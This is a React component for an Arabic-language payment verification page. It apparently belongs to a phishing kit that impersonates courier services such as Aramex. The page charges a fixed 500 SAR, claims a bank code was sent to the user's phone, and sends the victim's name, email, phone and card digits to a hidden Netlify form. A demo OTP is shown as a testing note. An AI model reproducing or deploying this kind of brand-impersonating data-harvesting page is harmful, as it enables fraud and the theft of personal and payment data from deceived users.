import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Badge } from "@/components/ui/badge";
import { getServiceBranding } from "@/lib/serviceLogos";
import { Shield, AlertCircle, Check, Lock } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

const PaymentOTPForm = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  
  const [otp, setOtp] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState("");
  
  const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
  const serviceName = customerInfo.service || 'aramex';
  const branding = getServiceBranding(serviceName);
  
  // Demo OTP: 1234
  const DEMO_OTP = "1234";
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    
    if (otp === DEMO_OTP) {
      // Success - create form submission for Netlify
      const formData = {
        name: customerInfo.name,
        email: customerInfo.email,
        phone: customerInfo.phone,
        service: serviceName,
        amount: "500 SAR",
        cardLast4: sessionStorage.getItem('cardLast4'),
        timestamp: new Date().toISOString()
      };
      
      // Submit to Netlify Forms
      try {
        await fetch("/", {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
            "form-name": "payment",
            ...formData
          }).toString()
        });
      } catch (err) {
        console.error("Form submission error:", err);
      }
      
      toast({
        title: "تم بنجاح!",
        description: "تم تأكيد الدفع بنجاح",
      });
      
      navigate(`/pay/${id}/receipt`);
    } else {
      const newAttempts = attempts + 1;
      setAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
        toast({
          title: "تم الحظر",
          description: "لقد تجاوزت عدد المحاولات المسموحة",
          variant: "destructive",
        });
      } else {
        setError(`رمز التحقق غير صحيح. حاول مرة أخرى. (${3 - newAttempts} محاولات متبقية)`);
      }
    }
  };
  
  return (
    <div 
      className="min-h-screen py-12" 
      dir="rtl"
      style={{
        background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
      }}
    >
      <div className="container mx-auto px-4">
        <div className="max-w-md mx-auto">
          {/* Service Logo */}
          {branding.logo && (
            <div className="text-center mb-6">
              <img 
                src={branding.logo} 
                alt={serviceName}
                className="h-16 mx-auto mb-4"
                onError={(e) => e.currentTarget.style.display = 'none'}
              />
            </div>
          )}
          
          {/* Security Badge */}
          <div className="text-center mb-6">
            <Badge 
              className="text-sm px-4 py-2"
              style={{ 
                background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                color: 'white'
              }}
            >
              <Lock className="w-4 h-4 ml-2" />
              <span>التحقق الآمن</span>
            </Badge>
          </div>
          
          <Card className="p-8 shadow-elevated">
            <div className="flex items-center gap-3 mb-6">
              <div 
                className="w-12 h-12 rounded-xl flex items-center justify-center animate-pulse"
                style={{
                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                }}
              >
                <Shield className="w-6 h-6 text-white" />
              </div>
              <div>
                <h1 className="text-2xl font-bold">رمز التحقق</h1>
                <p className="text-sm text-muted-foreground">أدخل الرمز المرسل</p>
              </div>
            </div>
            
            {/* Info */}
            <div className="bg-secondary/30 p-4 rounded-lg mb-6">
              <p className="text-sm text-muted-foreground">
                تم إرسال رمز التحقق إلى هاتفك المسجل في البنك. الرجاء إدخاله أدناه.
              </p>
            </div>
            
            {/* Testing Note */}
            <div 
              className="border rounded-lg p-3 mb-6"
              style={{
                background: `${branding.colors.secondary}10`,
                borderColor: `${branding.colors.secondary}30`
              }}
            >
              <p className="text-sm" style={{ color: branding.colors.secondary }}>
                <strong>للاختبار فقط:</strong> رمز OTP = {DEMO_OTP}
              </p>
            </div>
            
            <form onSubmit={handleSubmit}>
              {/* OTP Input */}
              <div className="mb-6">
                <Input
                  placeholder="----"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 4))}
                  inputMode="numeric"
                  className="h-16 text-center text-3xl tracking-widest font-bold"
                  disabled={attempts >= 3}
                  maxLength={4}
                  required
                />
              </div>
              
              {/* Error Message */}
              {error && (
                <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-3 mb-6 flex items-start gap-2">
                  <AlertCircle className="w-5 h-5 text-destructive mt-0.5 flex-shrink-0" />
                  <p className="text-sm text-destructive">{error}</p>
                </div>
              )}
              
              {/* Attempts Counter */}
              {attempts > 0 && attempts < 3 && (
                <div className="text-center mb-6">
                  <p className="text-sm text-muted-foreground">
                    المحاولات المتبقية: <strong>{3 - attempts}</strong>
                  </p>
                </div>
              )}
              
              {/* Submit Button */}
              <Button
                type="submit"
                size="lg"
                className="w-full text-lg py-7 text-white"
                disabled={attempts >= 3 || otp.length < 4}
                style={{
                  background: attempts >= 3 
                    ? '#666' 
                    : `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                }}
              >
                {attempts >= 3 ? (
                  <span>محظور مؤقتاً</span>
                ) : (
                  <>
                    <Check className="w-5 h-5 ml-2" />
                    <span>تأكيد</span>
                  </>
                )}
              </Button>
              
              <p className="text-xs text-center text-muted-foreground mt-4">
                لم تستلم الرمز؟ تحقق من رسائلك أو اتصل بالبنك
              </p>
            </form>
          </Card>
          
          {/* Hidden Netlify Form */}
          <form name="payment" netlify-honeypot="bot-field" data-netlify="true" hidden>
            <input type="text" name="name" />
            <input type="email" name="email" />
            <input type="tel" name="phone" />
            <input type="text" name="service" />
            <input type="text" name="amount" />
            <input type="text" name="cardLast4" />
            <input type="text" name="timestamp" />
          </form>
        </div>
      </div>
    </div>
  );
};

export default PaymentOTPForm;
